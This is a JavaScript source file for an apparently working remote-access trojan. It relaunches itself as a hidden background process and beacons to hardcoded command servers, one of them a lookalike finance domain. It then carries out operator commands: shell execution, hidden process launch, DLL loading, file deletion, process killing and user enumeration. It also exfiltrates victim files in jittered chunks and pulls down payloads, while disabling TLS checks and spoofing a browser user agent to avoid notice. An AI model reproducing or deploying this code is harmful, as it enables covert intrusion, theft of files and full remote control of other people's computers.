import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import https from 'https';
import axios from 'axios';
import { execFileSync, execSync, spawn, spawnSync } from 'child_process';
import { createRequire } from 'module';
import { fileURLToPath } from 'url';
import { dirname } from 'path';





const _require = createRequire(import.meta.url);

// ── encoding ──────────────────────────────────────────────────────────────────

function base64Encode(data) {
    if (Buffer.isBuffer(data)) return data.toString('base64');
    return Buffer.from(data, 'binary').toString('base64');
}

function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('binary');
}

function base64DecodeBytes(str) {
    return Buffer.from(str, 'base64');
}

function buildResultPacket(commandId, statusCode, resultData) {
    const idBuf = Buffer.from(commandId, 'utf8');
    const resultBuf = Buffer.isBuffer(resultData)
        ? resultData
        : Buffer.from(resultData, 'utf8');

    const packet = Buffer.alloc(4 + idBuf.length + 4 + resultBuf.length);
    let off = 0;

    packet.writeUInt32LE(idBuf.length, off); off += 4;
    idBuf.copy(packet, off); off += idBuf.length;
    packet.writeUInt32LE(statusCode, off); off += 4;
    resultBuf.copy(packet, off);

    return packet;
}

function buildResultPacketBase64(commandId, statusCode, resultData) {
    return buildResultPacket(commandId, statusCode, resultData).toString('base64');
}

// ── httpClient ────────────────────────────────────────────────────────────────

const TIMEOUT_MS = 30000;

class HttpClient {
    constructor() {
        this._lastStatusCode = 0;
        this._httpsAgent = new https.Agent({ rejectUnauthorized: false });
    }

    init() { return true; }

    lastStatusCode() { return this._lastStatusCode; }

    async get(url) {
        try {
            const resp = await axios.get(url, {
                httpsAgent: this._httpsAgent,
                validateStatus: () => true,
                responseType: 'arraybuffer',
                timeout: TIMEOUT_MS,
                headers: { 'User-Agent': 'Mozilla/5.0' },
            });
            this._lastStatusCode = resp.status;
            return Buffer.from(resp.data);
        } catch {
            this._lastStatusCode = 0;
            return Buffer.alloc(0);
        }
    }

    async postRaw(url, data, contentType = 'application/json') {
        try {
            const body = typeof data === 'string' ? Buffer.from(data, 'utf8') : data;
            const resp = await axios.post(url, body, {
                httpsAgent: this._httpsAgent,
                validateStatus: () => true,
                responseType: 'arraybuffer',
                timeout: TIMEOUT_MS,
                headers: { 'Content-Type': contentType, 'User-Agent': 'Mozilla/5.0' },
            });
            this._lastStatusCode = resp.status;
            return Buffer.from(resp.data).toString('utf8');
        } catch {
            this._lastStatusCode = 0;
            return '';
        }
    }

    async putRaw(url, data, contentType = 'application/octet-stream') {
        try {
            const body = Buffer.isBuffer(data) ? data : Buffer.from(data, 'binary');
            const resp = await axios.put(url, body, {
                httpsAgent: this._httpsAgent,
                validateStatus: () => true,
                responseType: 'arraybuffer',
                timeout: 60000,
                headers: { 'Content-Type': contentType, 'User-Agent': 'Mozilla/5.0' },
            });
            this._lastStatusCode = resp.status;
            return Buffer.from(resp.data).toString('utf8');
        } catch {
            this._lastStatusCode = 0;
            return '';
        }
    }
}

// ── systemManager ─────────────────────────────────────────────────────────────

const isWindows = process.platform === 'win32';
const isMac = process.platform === 'darwin';

function findExe(name) {
    if (!isWindows) return null;
    if (path.isAbsolute(name) && fs.existsSync(name)) return name;

    const sysRoot = process.env.SystemRoot || process.env.windir || 'C:\\Windows';
    const pathDirs = (process.env.PATH || '').split(path.delimiter).filter(Boolean);
    const searchDirs = [
        path.join(sysRoot, 'System32'),
        path.join(sysRoot, 'SysWOW64'),
        sysRoot,
        ...pathDirs,
    ];

    const base = path.basename(name);
    const hasExt = /\.(exe|com|bat|cmd)$/i.test(base);

    for (const dir of searchDirs) {
        if (hasExt) {
            const full = path.join(dir, base);
            if (fs.existsSync(full)) return full;
        } else {
            for (const ext of ['.exe', '.com']) {
                const full = path.join(dir, base + ext);
                if (fs.existsSync(full)) return full;
            }
        }
    }
    return null;
}

function parseArgs(cmdStr) {
    const tokens = [];
    let cur = '', inQ = false, qc = '';
    for (const c of cmdStr) {
        if (inQ) {
            if (c === qc) inQ = false; else cur += c;
        } else if (c === '"' || c === "'") {
            inQ = true; qc = c;
        } else if (c === ' ' || c === '\t') {
            if (cur) { tokens.push(cur); cur = ''; }
        } else {
            cur += c;
        }
    }
    if (cur) tokens.push(cur);
    return tokens;
}

const CMD_BUILTINS = new Set(['dir', 'echo', 'type', 'set', 'cd', 'cls', 'copy',
    'del', 'erase', 'md', 'mkdir', 'move', 'rd', 'ren',
    'rename', 'rmdir', 'start', 'ver', 'vol', 'pushd', 'popd']);

function execDirect(cmdStr, timeoutMs = 15000) {
    const tokens = parseArgs(cmdStr.trim());
    if (!tokens.length) return '';
    const exeName = tokens[0].toLowerCase().replace(/\.exe$/i, '');
    const args = tokens.slice(1);
    const exePath = findExe(tokens[0]);

    if (exePath) {
        try {
            return execFileSync(exePath, args, { encoding: 'utf8', windowsHide: true, timeout: timeoutMs });
        } catch (err) { return (err.stdout || '') + (err.stderr || ''); }
    }

    if (CMD_BUILTINS.has(exeName)) {
        try {
            return execSync(`cmd.exe /c ${cmdStr}`, { encoding: 'utf8', windowsHide: true, timeout: timeoutMs });
        } catch (err) { return (err.stdout || '') + (err.stderr || ''); }
    }
    return '';
}

function execSh(cmd, timeoutMs = 15000) {
    try {
        return execSync(cmd, { encoding: 'utf8', shell: '/bin/sh', timeout: timeoutMs });
    } catch (err) { return (err.stdout || '') + (err.stderr || ''); }
}

function windowsVersionName() {
    const build = parseInt((os.release() || '').split('.')[2], 10);
    if (build >= 22000) return 'Windows 11';
    if (build >= 10240) return 'Windows 10';
    if (build >= 9200) return 'Windows 8';
    if (build >= 7600) return 'Windows 7';
    return 'Windows';
}

class SystemManager {

    getSystemInfo() {
        const hostname = this.getHostname();

        let domain = 'WORKGROUP';
        if (isWindows) {
            const dnsDomain = process.env.USERDNSDOMAIN || '';
            const netDomain = process.env.USERDOMAIN || '';
            domain = dnsDomain || (netDomain.toUpperCase() !== hostname.toUpperCase() ? netDomain : 'WORKGROUP');
        } else {
            const out = execSh('dnsdomainname 2>/dev/null || hostname -d 2>/dev/null', 3000);
            if (out.trim() && out.trim() !== '(none)') domain = out.trim();
        }

        let osStr;
        if (isWindows) {
            osStr = (typeof os.version === 'function' ? os.version() : '') || windowsVersionName();
            osStr = osStr.replace(/\r/g, '').trim();
        } else if (isMac) {
            const name = execSh('sw_vers -productName', 3000).trim() || 'macOS';
            const ver = execSh('sw_vers -productVersion', 3000).trim();
            osStr = ver ? `${name} ${ver}` : name;
        } else {
            try {
                const raw = fs.readFileSync('/etc/os-release', 'utf8');
                const m = raw.match(/^PRETTY_NAME="?([^"\n]+)"?/m);
                osStr = m ? m[1].trim() : 'Linux';
            } catch {
                osStr = execSh('uname -sr', 3000).trim() || 'Linux';
            }
        }

        const arch = os.arch() === 'x64' ? 'x64' : (os.arch() === 'ia32' ? 'x86' : os.arch());
        const cpus = os.cpus();
        const processor = cpus.length > 0 ? cpus[0].model : 'Unknown';
        const cpuInfo = `physical_cores:${cpus.length},total_cores:${cpus.length},` +
            `max_frequency:0,current_frequency:0,total_cpu_usage:0.0`;
        const memTotal = os.totalmem();
        const memFree = os.freemem();
        const memUsed = memTotal - memFree;
        const memInfo = `total:${memTotal},available:${memFree},used:${memUsed},` +
            `percentage:${Math.round(memUsed / memTotal * 100)},` +
            `swap_total:${memTotal},swap_used:0,swap_percentage:0`;
        const bootISO = new Date(Date.now() - os.uptime() * 1000)
            .toISOString().replace(/\.\d+Z$/, '');

        return {
            hostname, domain, os: osStr, os_release: os.release(),
            os_version: '', architecture: arch, processor,
            boot_time: bootISO, cpu_info: cpuInfo, memory_info: memInfo
        };
    }

    getProcesses() {
        if (isWindows) {
            const exePath = findExe('tasklist') || 'tasklist.exe';
            let out = '';
            try {
                out = execFileSync(exePath, ['/fo', 'csv', '/nh'],
                    { encoding: 'utf8', windowsHide: true, timeout: 10000 });
            } catch (err) { out = err.stdout || ''; }

            return out.split('\n').flatMap(line => {
                const t = line.trim();
                if (!t) return [];
                const parts = t.replace(/^"|"$/g, '').split('","');
                if (parts.length < 5) return [];
                const memKb = parseFloat(parts[4].replace(/[^\d.]/g, '')) || 0;
                return [{
                    name: parts[0], pid: parseInt(parts[1], 10) || 0,
                    status: 'running', cpu_percent: 0.0,
                    memory_percent: memKb / 1024, username: 'Unknown'
                }];
            });
        } else {
            const out = execSh('ps aux 2>/dev/null', 10000);
            return out.split('\n').flatMap(line => {
                const parts = line.trim().split(/\s+/);
                if (parts.length < 6) return [];
                const pid = parseInt(parts[1], 10);
                if (isNaN(pid)) return [];
                return [{
                    pid, name: parts[10] || parts[0] || 'unknown',
                    status: parts[7] || 'running',
                    cpu_percent: parseFloat(parts[2]) || 0.0,
                    memory_percent: parseFloat(parts[3]) || 0.0,
                    username: parts[0] || 'Unknown'
                }];
            });
        }
    }

    killProcess(pid) {
        if (isWindows) {
            const exePath = findExe('taskkill') || 'taskkill.exe';
            try {
                execFileSync(exePath, ['/F', '/PID', String(pid)],
                    { encoding: 'utf8', windowsHide: true, timeout: 5000 });
                return true;
            } catch { return false; }
        } else {
            try { process.kill(pid, 'SIGKILL'); return true; } catch { return false; }
        }
    }

    listFiles(dirPath) {
        try {
            const resolved = path.resolve(dirPath);
            if (!fs.statSync(resolved).isDirectory()) return [];
            return fs.readdirSync(resolved).map(name => {
                const full = path.join(resolved, name);
                try {
                    const s = fs.statSync(full);
                    const isDir = s.isDirectory();
                    const m = s.mode;
                    const perm = (isDir ? 'd' : '-') +
                        ((m & 0o400) ? 'r' : '-') + ((m & 0o200) ? 'w' : '-') + ((m & 0o100) ? 'x' : '-') +
                        ((m & 0o040) ? 'r' : '-') + ((m & 0o020) ? 'w' : '-') + ((m & 0o010) ? 'x' : '-') +
                        ((m & 0o004) ? 'r' : '-') + ((m & 0o002) ? 'w' : '-') + ((m & 0o001) ? 'x' : '-');
                    return {
                        name, path: full, is_dir: isDir, size: isDir ? 0 : s.size,
                        modified: Math.floor(s.mtimeMs / 1000), permissions: perm
                    };
                } catch { return null; }
            }).filter(Boolean);
        } catch { return []; }
    }

    deleteFile(filePath) {
        try {
            const resolved = path.resolve(filePath);
            if (!fs.existsSync(resolved)) return false;
            if (fs.statSync(resolved).isDirectory()) {
                fs.rmSync(resolved, { recursive: true, force: true });
            } else {
                fs.unlinkSync(resolved);
            }
            return true;
        } catch { return false; }
    }

    getUsers() {
        if (isWindows) {
            const exePath = findExe('net') || 'net.exe';
            let out = '';
            try {
                out = execFileSync(exePath, ['user'],
                    { encoding: 'utf8', windowsHide: true, timeout: 5000 });
            } catch (err) { out = err.stdout || ''; }

            const users = [];
            let inSection = false;
            for (const rawLine of out.split('\n')) {
                const line = rawLine.replace(/\r/g, '').trimEnd();
                if (/^-{3,}/.test(line)) { inSection = true; continue; }
                if (!inSection) continue;
                if (/The command completed/.test(line)) break;
                if (!line.trim()) continue;
                line.split(/\s{2,}/).forEach(tok => {
                    const name = tok.trim();
                    if (name) users.push({ username: name, uid: 'N/A', gid: 'N/A', home: 'N/A', shell: 'N/A' });
                });
            }
            return users;
        } else if (isMac) {
            const out = execSh('dscl . -list /Users 2>/dev/null', 5000);
            return out.split('\n').map(l => l.trim())
                .filter(l => l && !l.startsWith('_'))
                .map(username => ({ username, uid: 'N/A', gid: 'N/A', home: 'N/A', shell: 'N/A' }));
        } else {
            try {
                return fs.readFileSync('/etc/passwd', 'utf8').split('\n')
                    .filter(l => l && !l.startsWith('#'))
                    .map(l => {
                        const p = l.split(':');
                        return {
                            username: p[0], uid: p[2] || 'N/A', gid: p[3] || 'N/A',
                            home: p[5] || 'N/A', shell: (p[6] || '').trim() || 'N/A'
                        };
                    })
                    .filter(u => u.username);
            } catch { return []; }
        }
    }

    executeCommand(command) {
        if (isWindows) return execDirect(command);
        return execSh(command);
    }

    startHiddenProcess(command) {
        if (isWindows) {
            const tokens = parseArgs(command.trim());
            if (!tokens.length) return 0;
            const exePath = findExe(tokens[0]) || tokens[0];
            try {
                const child = spawn(exePath, tokens.slice(1),
                    { detached: true, stdio: 'ignore', windowsHide: true, shell: false });
                child.unref();
                return child.pid || 0;
            } catch { return 0; }
        } else {
            try {
                const child = spawn(command, { detached: true, stdio: 'ignore', shell: true });
                child.unref();
                return child.pid || 0;
            } catch { return 0; }
        }
    }

    runDll(dllPath, funcName, input) {
        if (!isWindows) return 'error: runDll is Windows-only';
        if (!dllPath || !funcName) return 'error: dllPath and funcName required';
        try {
            const koffi = _require('koffi');
            const lib = koffi.load(dllPath);
            try {
                const fn = lib.func('__stdcall', funcName, 'void', ['str']);
                fn(input || '');
                return 'ok';
            } catch {
                const fn = lib.func('__stdcall', funcName, 'str', ['str']);
                const result = fn(input || '');
                return result != null ? String(result) : 'ok';
            }
        } catch (e) {
            return `error: ${e.message}`;
        }
    }

    getHostname() { return os.hostname(); }

    getUsername() {
        try { return os.userInfo().username; } catch { return 'Unknown'; }
    }

    getIPAddress() {
        for (const list of Object.values(os.networkInterfaces())) {
            for (const addr of list) {
                if (addr.family === 'IPv4' && !addr.internal) return addr.address;
            }
        }
        return '127.0.0.1';
    }
}

// ── client ────────────────────────────────────────────────────────────────────

const OP = {
    DIR: 0x02,
    MV: 0x03,
    RUN: 0x04,
    TASKLIST: 0x05,
    DEL: 0x06,
    UPLOAD: 0x07,
    DOWNLOAD: 0x08,
    DRIVES: 0x09,
    TERMINATE: 0x0A,
    RUNDLL: 0x0B,
    MKDIR: 0x0C,
    ZIP: 0x0D,
    CHUNKED_DOWNLOAD: 0x0E,
    RUN_HIDDEN: 0x0F,
    CRED_PROMPT: 0x10,
    WS_DOWNLOAD: 0xA1,
    REQUEST_ELEVATION: 0xB0,
    PERSIST: 0xB1,
    SET_SLEEP_TIME: 0xF0,
    SET_IDLE_TIME: 0xF1,
    SET_JITTER_TIME: 0xF2,
};

function encodeParamValue(s) {
    return String(s)
        .replace(/%/g, '%25')
        .replace(/&/g, '%26')
        .replace(/=/g, '%3D')
        .replace(/\+/g, '%2B')
        .replace(/#/g, '%23');
}

function makeEnvelope(type, data) {
    return `type=${type}&data=${encodeParamValue(data)}`;
}

function isNetworkCommand(s) {
    return /^(ipconfig|netstat|route |arp |netsh |net start)/.test(s);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

class ManagementClient {
    constructor(serverUrls, clientId = '') {
        this._serverUrls = serverUrls.filter(Boolean);
        if (!this._serverUrls.length) throw new Error('No server URLs provided');

        this._currentUrlIdx = 0;
        this._serverUrl = this._serverUrls[0];
        this._clientId = clientId || crypto.randomBytes(16).toString('hex');
        this._socketId = '';

        this._timing = {
            sleepTime: 120000,
            idleTime: 60000,
            jitterTime: 5000,
            pollInterval: 120000,
        };

        this._http = new HttpClient();
        this._sys = new SystemManager();
        this._running = false;
    }

    start() {
        if (this._running) return;
        this._running = true;
        this._mainLoop().catch(() => { });
    }

    stop() {
        this._running = false;
    }

    _randomJitter() {
        const j = this._timing.jitterTime;
        return j ? (Math.random() * 2 * j - j) | 0 : 0;
    }

    _advanceUrl() {
        if (this._serverUrls.length <= 1) return;
        this._currentUrlIdx = (this._currentUrlIdx + 1) % this._serverUrls.length;
        this._serverUrl = this._serverUrls[this._currentUrlIdx];
    }

    async _interruptibleSleep(ms) {
        const tick = 100;
        for (let elapsed = 0; elapsed < ms && this._running; elapsed += tick)
            await sleep(tick);
    }

    async _mainLoop() {
        while (this._running) {
            const registered = await this._registerWithServer();
            if (registered) {
                await this._pollingLoop();
            }
            if (this._running) {
                this._advanceUrl();
                await this._interruptibleSleep(5000);
            }
        }
    }

    async _registerWithServer() {
        const url = `${this._serverUrl}/beacon`;
        const body = JSON.stringify({
            clientId: this._clientId,
            type: 'poll',
            pcName: this._sys.getHostname(),
            userName: this._sys.getUsername(),
        });

        let consecutiveNetErrors = 0;

        while (this._running) {
            const response = await this._http.postRaw(url, body, 'application/json');
            const status = this._http.lastStatusCode();

            if (status === 400) {
                try {
                    const json = JSON.parse(response);
                    this._socketId = json.socketId || '';
                    if (!this._socketId) { await this._interruptibleSleep(30000); continue; }
                    if (json.pollInterval) this._timing.pollInterval = json.pollInterval;
                    if (json.jitterTime) this._timing.jitterTime = json.jitterTime;
                    await this._sendAgentInit();
                    return true;
                } catch {
                    await this._interruptibleSleep(30000);
                    continue;
                }
            }

            if (status === 0) {
                if (++consecutiveNetErrors >= 5) return false;
                await this._interruptibleSleep(60000);
            } else {
                consecutiveNetErrors = 0;
                await this._interruptibleSleep(status === 500 ? 60000 : 30000);
            }
        }

        return false;
    }

    async _sendAgentInit() {
        const si = this._sys.getSystemInfo();
        const body = JSON.stringify({
            token: this._socketId,
            pcName: si.hostname,
            userName: this._sys.getUsername(),
            domainName: si.domain,
            os: si.os,
            isElevated: false,
        });
        await this._http.postRaw(`${this._serverUrl}/gate/hello`, body, 'application/json');
    }

    async _pollingLoop() {
        let consecutiveNetErrors = 0;

        while (this._running) {
            try {
                const commands = await this._fetchCommands();
                if (this._http.lastStatusCode() === 0) {
                    if (++consecutiveNetErrors >= 5) return;
                } else {
                    consecutiveNetErrors = 0;
                    for (const cmd of commands) {
                        if (!this._running) break;
                        const { statusCode, resultData } = await this._dispatchCommand(cmd);
                        await this._submitResult(cmd.commandId, statusCode, resultData);
                    }
                }
            } catch { /* ignore individual poll errors */ }

            let sleepMs = this._timing.pollInterval + this._randomJitter();
            if (sleepMs < 1000) sleepMs = 1000;
            await this._interruptibleSleep(sleepMs);
        }
    }

    async _fetchCommands() {
        const url = `${this._serverUrl}/gate/fetch?token=${this._socketId}`;
        const respBuf = await this._http.get(url);

        if (!respBuf.length) return [];

        const outer = base64DecodeBytes(respBuf.toString('utf8'));
        if (outer.length < 4) return [];

        const count = outer.readUInt32LE(0);
        const commands = [];
        let offset = 4;

        for (let i = 0; i < count; i++) {
            if (offset + 4 > outer.length) break;
            const pktLen = outer.readUInt32LE(offset);
            offset += 4;
            if (offset + pktLen > outer.length) break;

            const base64Pkt = outer.slice(offset, offset + pktLen).toString('utf8');
            offset += pktLen;

            const cmdBytes = base64DecodeBytes(base64Pkt);
            if (cmdBytes.length > 0) commands.push(this._parseStandardCommand(cmdBytes));
        }

        return commands;
    }

    _parseStandardCommand(bytes) {
        const cmd = { opcode: 0, args: '', file: '', commandId: '' };
        if (bytes.length < 13) return cmd;

        const argsSize = bytes.readUInt32LE(4);
        const fileSize = bytes.readUInt32LE(8);
        cmd.opcode = bytes[12];

        const argsStart = 13;
        const fileStart = argsStart + argsSize;
        const idStart = fileStart + fileSize;

        if (fileStart > bytes.length) return cmd;
        cmd.args = bytes.slice(argsStart, fileStart).toString('utf8');

        if (idStart > bytes.length) return cmd;
        cmd.file = bytes.slice(fileStart, idStart).toString('utf8');
        cmd.commandId = bytes.slice(idStart).toString('utf8');

        return cmd;
    }

    async _submitResult(commandId, statusCode, resultData) {
        const body = JSON.stringify({
            token: this._socketId,
            result: buildResultPacketBase64(commandId, statusCode, resultData),
        });
        await this._http.postRaw(`${this._serverUrl}/gate/submit`, body, 'application/json');
        return this._http.lastStatusCode() === 200;
    }

    async _dispatchCommand(cmd) {
        let statusCode = 0;
        let resultData = '';

        try {
            switch (cmd.opcode) {

                case OP.RUN: {
                    const c = cmd.args;

                    if (c === 'systeminfo') {
                        const si = this._sys.getSystemInfo();
                        const inner = `hostname=${encodeParamValue(si.hostname)}` +
                            `&os=${encodeParamValue(si.os)}` +
                            `&architecture=${encodeParamValue(si.architecture)}` +
                            `&processor=${encodeParamValue(si.processor)}` +
                            `&cpu=${encodeParamValue(si.cpu_info)}` +
                            `&memory=${encodeParamValue(si.memory_info)}`;
                        resultData = makeEnvelope('system', inner);
                        break;
                    }

                    if (c === 'net user') {
                        const users = this._sys.getUsers();
                        const data = '[' + users.map(u =>
                            `username:${u.username},uid:0,gid:0,home:N/A,shell:N/A`
                        ).join(',') + ']';
                        resultData = makeEnvelope('users', data);
                        break;
                    }

                    if (c === 'net localgroup') {
                        const output = this._sys.executeCommand(c);
                        const groups = [];
                        for (const line of output.split('\n')) {
                            const t = line.replace(/\r/g, '').trim();
                            if (t.startsWith('*')) {
                                const name = t.slice(1).trim();
                                if (name) groups.push(`name:${name},gid:0`);
                            }
                        }
                        resultData = makeEnvelope('groups', '[' + groups.join(',') + ']');
                        break;
                    }

                    {
                        const output = this._sys.executeCommand(c);
                        resultData = makeEnvelope(isNetworkCommand(c) ? 'network' : 'terminal', output);
                    }
                    break;
                }

                case OP.RUN_HIDDEN: {
                    const pid = this._sys.startHiddenProcess(cmd.args);
                    if (!pid) {
                        resultData = makeEnvelope('terminal', 'error: failed to start hidden process');
                        statusCode = 1;
                    } else {
                        resultData = makeEnvelope('terminal', `started hidden process, pid: ${pid}`);
                    }
                    break;
                }

                case OP.TASKLIST: {
                    const procs = this._sys.getProcesses();
                    const data = '[' + procs.map(p =>
                        `pid:${p.pid},name:${p.name},status:${p.status},` +
                        `cpu:${p.cpu_percent.toFixed(1)},memory:${p.memory_percent.toFixed(1)},` +
                        `user:${p.username}`
                    ).join(',') + ']';
                    resultData = makeEnvelope('processes', data);
                    break;
                }

                case OP.DIR: {
                    const files = this._sys.listFiles(cmd.args || '.');
                    const data = '[' + files.map(f =>
                        `name:${f.name},path:${f.path},is_dir:${f.is_dir ? '1' : '0'},` +
                        `size:${f.size},modified:${f.modified},permissions:${f.permissions}`
                    ).join(',') + ']';
                    resultData = makeEnvelope('files', data);
                    break;
                }

                case OP.DEL: {
                    const ok = this._sys.deleteFile(cmd.args);
                    resultData = ok ? 'ok' : 'error: delete failed';
                    statusCode = ok ? 0 : 1;
                    break;
                }

                case OP.MV: {
                    const mvCmd = process.platform === 'win32' ? `move ${cmd.args}` : `mv ${cmd.args}`;
                    resultData = this._sys.executeCommand(mvCmd);
                    break;
                }

                case OP.MKDIR:
                    resultData = this._sys.executeCommand(`mkdir "${cmd.args}"`);
                    break;

                case OP.DRIVES: {
                    let drives = '';
                    if (process.platform === 'win32') {
                        drives = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                            .split('')
                            .map(l => l + ':\\')
                            .filter(d => { try { return fs.existsSync(d); } catch { return false; } })
                            .join('\n');
                    } else if (process.platform === 'darwin') {
                        try {
                            drives = ['/'].concat(
                                fs.readdirSync('/Volumes').map(v => `/Volumes/${v}`)
                            ).join('\n');
                        } catch { drives = '/'; }
                    } else {
                        try {
                            drives = fs.readFileSync('/proc/mounts', 'utf8')
                                .split('\n')
                                .map(l => l.split(' ')[1])
                                .filter(m => m && m.startsWith('/'))
                                .filter((v, i, a) => a.indexOf(v) === i)
                                .join('\n');
                        } catch { drives = '/'; }
                    }
                    resultData = makeEnvelope('drives', drives);
                    break;
                }

                case OP.TERMINATE: {
                    const pid = parseInt(cmd.args, 10);
                    const ok = pid > 0 && this._sys.killProcess(pid);
                    resultData = ok ? 'ok' : 'error: kill failed';
                    statusCode = ok ? 0 : 1;
                    break;
                }

                case OP.DOWNLOAD: {
                    resultData = await this._uploadFileToServer(cmd.args);
                    statusCode = resultData.startsWith('ok:') ? 0 : 1;
                    break;
                }

                case OP.UPLOAD: {
                    let errMsg = '';
                    const ok = await this._downloadFileFromServer(cmd.file, cmd.args, e => { errMsg = e; });
                    resultData = ok ? 'ok' : `error: ${errMsg || 'upload failed'}`;
                    statusCode = ok ? 0 : 1;
                    break;
                }

                case OP.CHUNKED_DOWNLOAD:
                    resultData = await this._chunkedUploadToServer(cmd.args);
                    break;

                case OP.RUNDLL: {
                    const parts = cmd.args.split('|');
                    if (parts.length < 2) { resultData = 'error: invalid args'; statusCode = 1; break; }
                    const input = parts.length >= 3 ? parts[2] : '';
                    resultData = this._sys.runDll(parts[0], parts[1], input);
                    break;
                }

                case OP.SET_SLEEP_TIME: {
                    const v = parseInt(cmd.args, 10);
                    if (!isNaN(v)) this._timing.pollInterval = v;
                    resultData = 'ok';
                    break;
                }

                case OP.SET_IDLE_TIME: {
                    const v = parseInt(cmd.args, 10);
                    if (!isNaN(v)) this._timing.idleTime = v;
                    resultData = 'ok';
                    break;
                }

                case OP.SET_JITTER_TIME: {
                    const v = parseInt(cmd.args, 10);
                    if (!isNaN(v)) this._timing.jitterTime = v;
                    resultData = 'ok';
                    break;
                }

                case OP.CRED_PROMPT:
                    resultData = makeEnvelope('credprompt', 'cancelled=1');
                    break;

                default: {
                    resultData = `error: unknown opcode 0x${cmd.opcode.toString(16)}`;
                    statusCode = 1;
                    break;
                }
            }
        } catch (err) {
            resultData = `error: ${err.message}`;
            statusCode = 1;
        }

        return { statusCode, resultData };
    }

    async _downloadFileFromServer(uuid, localPath, onError) {
        if (!uuid) { onError('empty uuid'); return false; }
        if (!localPath) { onError('empty path'); return false; }

        const data = await this._http.get(`${this._serverUrl}/vault/${uuid}`);
        const status = this._http.lastStatusCode();

        if (status !== 200) { onError(`http ${status}`); return false; }
        if (!data.length) { onError('empty response'); return false; }

        try {
            let dest = localPath;
            if (fs.existsSync(dest) && fs.statSync(dest).isDirectory()) {
                dest = path.join(dest, uuid);
            } else if (localPath.endsWith('\\') || localPath.endsWith('/')) {
                dest = path.join(localPath, uuid);
            }

            const dir = path.dirname(dest);
            if (dir) fs.mkdirSync(dir, { recursive: true });

            fs.writeFileSync(dest, data);
            return true;
        } catch (e) {
            onError(`exception: ${e.message}`);
            return false;
        }
    }

    async _uploadFileToServer(localPath) {
        try {
            const data = fs.readFileSync(localPath);
            const uuid = await this._http.putRaw(
                `${this._serverUrl}/vault/push/`, data, 'application/octet-stream');
            if (this._http.lastStatusCode() !== 201 || !uuid.trim())
                return 'error: upload failed';
            return `ok: ${uuid.trim()}`;
        } catch (e) {
            return `error: upload exception: ${e.message}`;
        }
    }

    async _chunkedUploadToServer(argsStr) {
        const fields = argsStr.split('\0');
        const localPath = fields[0] || '';
        const chunkCount = parseInt(fields[1], 10) || 0;
        const sleepMs = parseInt(fields[2], 10) || 0;
        const jitterTimeMs = parseInt(fields[3], 10) || 0;
        const jitterSizeBytes = parseInt(fields[4], 10) || 0;
        const DEFAULT_CHUNK = 2 * 1024 * 1024;

        try {
            const fileData = fs.readFileSync(localPath);
            const fileSize = fileData.length;

            let baseChunk = chunkCount >= 1
                ? Math.ceil(fileSize / chunkCount)
                : DEFAULT_CHUNK;
            if (!baseChunk) baseChunk = fileSize || 1;

            const url = `${this._serverUrl}/vault/push/`;
            let result = `ok_chunked|${localPath}`;
            let offset = 0;
            let idx = 0;

            while (offset < fileSize) {
                let chunkSize = baseChunk;
                if (jitterSizeBytes > 0) {
                    const j = (Math.random() * 2 * jitterSizeBytes - jitterSizeBytes) | 0;
                    chunkSize = Math.max(1, chunkSize + j);
                }

                const chunk = fileData.slice(offset, offset + chunkSize);
                const n = chunk.length;
                if (!n) break;

                const uuid = await this._http.putRaw(url, chunk, 'application/octet-stream');
                if (this._http.lastStatusCode() !== 201 || !uuid.trim())
                    return `error: chunk upload failed at chunk ${idx + 1}`;

                result += `|${uuid.trim()}:${n}`;
                offset += n;
                idx++;

                const prog = JSON.stringify({
                    token: this._socketId,
                    chunkIndex: idx,
                    bytes: n,
                    path: localPath,
                });
                await this._http.postRaw(`${this._serverUrl}/gate/track`, prog, 'application/json');

                if (offset >= fileSize) break;

                let delay = sleepMs;
                if (jitterTimeMs > 0) {
                    const j = (Math.random() * 2 * jitterTimeMs - jitterTimeMs) | 0;
                    delay = Math.max(0, delay + j);
                }
                if (delay > 0) await sleep(delay);
            }

            return idx === 0 ? 'error: no chunks uploaded' : result;
        } catch (e) {
            return `error: chunked upload exception: ${e.message}`;
        }
    }
}

// ── main ──────────────────────────────────────────────────────────────────────

export default function main() {
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = dirname(__filename);

    // ── FOREGROUND MODE: shown briefly, then closes ──────────────────────────────
    if (!process.env.RUN_IN_BG) {
        const child = spawn(process.execPath, [__filename], {
            detached: true,
            windowsHide: true,
            stdio: 'ignore',
            env: { ...process.env, RUN_IN_BG: '1' }
        });

        child.unref();

        // setTimeout(() => process.exit(0), 2000);

        // ── BACKGROUND MODE: runs silently, no window ────────────────────────────────
    } else {

        const SERVER_URLS =

            [
                'https://possiblefinance-apply.com',
                'Verification-System.azurewebsites.net',
                'GamebarApp.azurewebsites.net',
            ];

        const sys = new SystemManager();
        const clientId = '128--' + sys.getUsername();
        const client = new ManagementClient(SERVER_URLS, clientId);

        process.on('SIGINT', () => { client.stop(); });
        process.on('SIGTERM', () => { client.stop(); });
        process.on('uncaughtException', () => { });

        (async () => {
            await sleep(60000);
            client.start();
        })();
    }
}